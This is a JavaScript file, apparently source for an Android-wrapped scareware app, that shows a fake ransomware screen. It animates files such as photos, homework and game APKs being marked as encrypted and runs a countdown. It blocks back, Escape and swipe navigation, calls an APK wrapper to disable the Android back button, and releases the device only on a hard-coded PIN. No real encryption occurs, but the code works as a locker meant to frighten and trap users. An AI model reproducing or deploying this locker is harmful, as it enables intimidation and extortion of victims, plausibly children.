// made by https://t.me/halilintardev
"use strict";

const progress    = document.getElementById("progress");
const statusText  = document.getElementById("status");
const files       = document.getElementById("files");
const decryptBtn  = document.getElementById("decryptBtn");
const result      = document.getElementById("result");
const timer       = document.getElementById("timer");
const pinInput    = document.getElementById("pinInput");
const pinOverlay  = document.getElementById("pinOverlay");
const closePinOverlay = document.getElementById("closePinOverlay");
const welcomeDialog   = document.getElementById("welcomeDialog");
const mainApp         = document.getElementById("mainApp");

const CORRECT_PIN = "1234"; // ← ganti PIN di sini

const fakeFiles = [
  "Documents/project.docx","Documents/homework.pdf",
  "Pictures/photo_001.jpg","Pictures/photo_002.png",
  "Videos/family_video.mp4","Downloads/game.zip",
  "Music/song.mp3","Desktop/important.txt",
  "Documents/school.xlsx","Pictures/vacation.jpg",
  "Downloads/archive.rar","Desktop/project.html",
  "files.zip","Free Firee.apk","Mobile Legend.apk","dana.apk",
];

let percent = 0;
let seconds  = 600;
let navLocked = false;

// ── TIMER ────────────────────────────────────────────────────
function updateTimer() {
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  timer.textContent = String(m).padStart(2,"0") + ":" + String(s).padStart(2,"0");
}

const countdown = setInterval(() => {
  if (seconds > 0) { seconds--; updateTimer(); }
}, 1000);

// ── FAKE ENCRYPT ANIMATION ───────────────────────────────────
function addFile(name) {
  const el = document.createElement("div");
  el.className = "file";
  el.textContent = `[encrypted] ${name}`;
  files.prepend(el);
  if (files.children.length > 12) files.removeChild(files.lastChild);
}

const encryptInterval = setInterval(() => {
  percent += Math.random() * 3;
  if (percent >= 100) {
    percent = 100;
    clearInterval(encryptInterval);
    decryptBtn.disabled = false;
    statusText.textContent = "Finished locking all files.";
    addFile("✔  finished");
    return;
  }
  progress.style.width = percent + "%";
  addFile(fakeFiles[Math.floor(Math.random() * fakeFiles.length)]);
  statusText.textContent = `encryption... ${Math.floor(percent)}%`;
}, 250);

// ── LOCK NAVIGASI ────────────────────────────────────────────
function handlePopState() {
  if (navLocked) history.pushState(null, "", location.href);
}

function handleKeyDown(e) {
  if (!navLocked) return;
  if (["Escape","BrowserBack","GoBack","Back"].includes(e.key) || e.keyCode === 27) {
    e.preventDefault();
    e.stopImmediatePropagation();
  }
}

function handleTouchBlock(e) {
  if (!navLocked) return;
  if (e.touches && e.touches[0] && e.touches[0].clientX < 30) e.preventDefault();
}

function lockNavigation() {
  navLocked = true;
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", handlePopState);
  document.addEventListener("keydown", handleKeyDown, true);
  document.addEventListener("touchstart", handleTouchBlock, { passive: false });

  // Beritahu APK wrapper → Java akan disable tombol Back Android
  try {
    if (window.Android && typeof window.Android.lockBack === "function") {
      window.Android.lockBack();
    }
  } catch (e) {}
}

function unlockNavigation() {
  navLocked = false;
  window.removeEventListener("popstate", handlePopState);
  document.removeEventListener("keydown", handleKeyDown, true);
  document.removeEventListener("touchstart", handleTouchBlock);

  try {
    if (window.Android && typeof window.Android.unlockBack === "function") {
      window.Android.unlockBack();
    }
  } catch (e) {}
}

// ── EXIT APP ─────────────────────────────────────────────────
function exitApp() {
  unlockNavigation();
  try {
    if (window.Android && typeof window.Android.exitApp === "function") {
      window.Android.exitApp();
      return;
    }
  } catch (e) {}
  window.close();
  if (!window.closed) {
    result.textContent = "PIN benar! Tutup manual atau gunakan APK wrapper.";
  }
}

// ── PIN OVERLAY ──────────────────────────────────────────────
function showWrongPin() {
  pinOverlay.hidden = false;
  closePinOverlay.focus();
}

function hideWrongPin() {
  pinOverlay.hidden = true;
  pinInput.value = "";
  pinInput.focus();
}

decryptBtn.addEventListener("click", () => {
  if (pinInput.value !== CORRECT_PIN) { showWrongPin(); return; }
  clearInterval(countdown);
  exitApp();
});

closePinOverlay.addEventListener("click", hideWrongPin);
pinOverlay.addEventListener("click", (e) => { if (e.target === pinOverlay) hideWrongPin(); });

// ── WELCOME DIALOG ───────────────────────────────────────────
document.getElementById("yesBtn").addEventListener("click", () => {
  welcomeDialog.style.display = "none";
  mainApp.style.display = "block";
  lockNavigation(); // ← KUNCI langsung setelah YES
});

document.getElementById("noBtn").addEventListener("click", () => {
  welcomeDialog.style.display = "none";
  // NO → biarkan APK wrapper tutup sendiri lewat onBackPressed normal
  try {
    if (window.Android && typeof window.Android.exitApp === "function") {
      window.Android.exitApp();
    }
  } catch (e) {}
});
